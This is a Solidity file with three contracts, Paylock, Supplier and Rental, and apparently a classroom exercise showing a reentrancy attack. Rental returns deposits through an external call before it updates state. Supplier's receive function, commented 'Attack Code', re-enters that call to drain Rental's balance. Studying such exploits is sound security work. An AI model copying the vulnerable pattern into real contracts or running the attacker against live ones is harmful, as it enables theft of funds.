pragma solidity >=0.4.16 <0.7.0;

contract Paylock {
    
    enum State { Working , Completed , Done_1 , Delay , Done_2 , Forfeit }
    
    int disc;
    int clock;
    State st;
    address timeAdd;
    
    constructor(address timadd) public {
        st = State.Working;
        timeAdd = timadd;
        disc = 0;
    }

    function signal() public {
        require( st == State.Working );
        st = State.Completed;
        disc = 10;
        clock = 0;
    }

    function collect_1_Y() public {
        require( st == State.Completed && clock < 4); //checking clock less than 4 ticks
        st = State.Done_1;
        disc = 10;
    }

    function collect_1_N() external {
        require( st == State.Completed && clock >= 4); 
        st = State.Delay;
        disc = 5;
        clock = 0;                                     
    }

    function collect_2_Y() external {
        require( st == State.Delay && clock < 4);
        st = State.Done_2;
        disc = 5;
    }

    function collect_2_N() external {
        require( st == State.Delay && clock >= 4);
        st = State.Forfeit;
        disc = 0;
    }
    
    function tick() external {
        require((st == State.Completed || st == State.Delay) && msg.sender == timeAdd);
        clock = clock + 1;
    }
    
    

}

contract Supplier {
    
    Paylock p;
    Rental r;
    enum State { Working , Completed }
    int acquire_resources;
    State st;
    
    constructor(address pp, address rr) public payable {
        p = Paylock(pp);
        r = Rental(rr);
        st = State.Working;
        acquire_resources = 0;
    }
    
    function acquire_resource() external  {
        require( st == State.Working && acquire_resources == 0 );
        r.rent_out_resource.value(1 wei)();
        acquire_resources = 1;
    }
    
    function return_resource() external {
        require( st == State.Working && acquire_resources == 1 );
        r.retrieve_resource();
        acquire_resources = 2;
    }
    
    function finish() external {
        require (st == State.Working && acquire_resources == 2);
        p.signal();
        st = State.Completed;
    }
    
    receive() external payable {
        if(address(r).balance > 1){
        r.retrieve_resource();}         // Attack Code
    }
    
    function get_balance() public view returns (uint){
        return address(this).balance;
    }
    
}

contract Rental {
    
    address resource_owner;
    bool resource_available;
    uint deposit;
    
    constructor() public payable {
        resource_available = true;
    }
    
    function rent_out_resource() external payable {
        require(resource_available == true);
        require( msg.value >= 1 wei );//CHECK FOR PAYMENT HERE
        deposit = msg.value;
        resource_owner = msg.sender;
        resource_available = false;
    }

    function retrieve_resource() external {
        require(resource_available == false && msg.sender == resource_owner);
        (bool b,) = resource_owner.call.value(deposit)(""); //RETURN DEPOSIT HERE
        require(b,"Failed Attack");
        resource_available = true;
        

        
    }
    
    function get_balance() public view returns (uint){
        return address(this).balance;
    }
    
     
}